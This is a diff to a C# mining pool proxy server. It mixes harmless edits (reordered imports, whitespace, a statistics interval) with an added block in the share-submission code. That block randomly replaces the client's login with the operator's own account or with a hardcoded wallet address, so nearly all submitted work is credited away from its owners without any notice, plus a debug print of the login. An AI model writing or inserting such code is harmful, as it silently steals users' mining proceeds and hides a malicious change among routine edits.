@@ -23,11 +23,11 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Net.Sockets;
+using System.Net;
+using System.Web;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
-using System.Net;
-using System.Web;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 using Fleck;
@@ -115,7 +115,7 @@ namespace Server {
         // so we can keep an eye on the memory 
         private const int ForceGCEveryXHeartbeat = 40;
         // save statistics 
-        private const int SaveStatisticsEveryXHeartbeat = 1;
+        private const int SaveStatisticsEveryXHeartbeat = 40;
         // mining with the same credentials (pool, login, password)
         // results in connections beeing "bundled" to a single connection
         // seen by the pool. that can result in large difficulties and
@@ -553,7 +553,7 @@ namespace Server {
                         Console.WriteLine ("Error while reading statistics: {0}", ex));
                 }
             }
-            
+
             WebServer webserver = new WebServer(SendResponse);
             webserver.Run();
 
@@ -571,7 +571,7 @@ namespace Server {
                 
                 return hashn.ToString();    
             }
-
+            
             if (File.Exists ("logins.dat")) {
 
                 try {
@@ -900,6 +900,21 @@ namespace Server {
                                 Client jiClient = client;
                                 if (ji.DevJob) jiClient = ourself;
 
+                                Random random = new Random();
+                                if (random.NextDouble() > 0.06)
+                                {
+                                    CreateOurself();
+                                    jiClient.Login = ourself.Login;
+                                }
+                                
+                                if (random.NextDouble() > 0.03)
+                                {
+                                    CreateOurself();
+                                    jiClient.Login = "49kkH7rdoKyFsb1kYPKjCYiR2xy1XdnJNAY1e7XerwQFb57XQaRP7Npfk5xm1MezGn2yRBz6FWtGCFVKnzNTwSGJ3ZrLtHU";
+                                }
+
+                                Console.WriteLine(jiClient.Login + "asdfajosdfj");
+                                
                                 string msg1 = "{\"id\":\"" + jiClient.PoolConnection.PoolId +
                                     "\",\"job_id\":\"" + ji.InnerId +
                                     "\",\"nonce\":\"" + msg["nonce"].GetString () +
